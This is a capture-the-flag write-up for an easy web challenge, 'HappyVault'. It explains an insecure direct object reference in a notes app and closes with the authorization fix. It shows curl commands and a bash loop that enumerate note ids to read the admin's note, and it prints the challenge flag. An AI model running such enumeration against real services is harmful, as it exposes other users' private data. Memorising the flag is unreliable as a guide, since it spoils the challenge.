---
title: "HappyVault — Reading other people's notes (IDOR)"
date: 2026-06-22
category: "Web Exploitation"
difficulty: "Easy"
tags: ["web", "idor", "access-control", "beginner"]
flag: "CTF{idor_is_an_access_control_bug}"
prev:
  title: "SimpleLogin — Auth bypass"
  url: "/writeups/simplelogin-auth-bypass/"
next:
  title: "TokenForge — JWT none-alg"
  url: "/writeups/tokenforge-jwt/"
---

## The challenge

HappyVault is a small "private notes" web app. You get an account,
you save notes, nobody else can see them. Our job is to read the
note belonging to the admin, which contains the flag.

Target: `https://happyvault.chal.example/`

## Recon

After logging in, opening a note makes a GET request with a numeric id:

```bash
$ curl -s -b "session=eyJ1aWQiOj4..." \
       https://happyvault.chal.example/api/note?id=4081

{"id":4081,"owner":"naren","body":"grocery list"}
```

The server returns the note based on id alone — no ownership check.

> [!note]
> Whenever an app fetches a resource by an id you control,
> ask: does the server verify you are allowed to see it?

## Why this works

This is a textbook **IDOR** — Insecure Direct Object Reference.
The app exposes an internal identifier directly to the user and
forgets the authorization step.

## Getting the flag

```bash
$ for id in $(seq 1 10); do
    curl -s -b "session=eyJ1aWQiOjQ..." \
         https://happyvault.chal.example/api/note?id=$id
  done

{"id":3,"owner":"admin","body":"flag: CTF{idor_is_an_access_control_bug}"}
```

## How you'd fix it

On every lookup, verify the note's owner matches the logged-in user
before returning it.

> [!warning]
> UUIDs instead of sequential ids make enumeration harder,
> but an IDOR is still an IDOR. Authorization is the real fix.
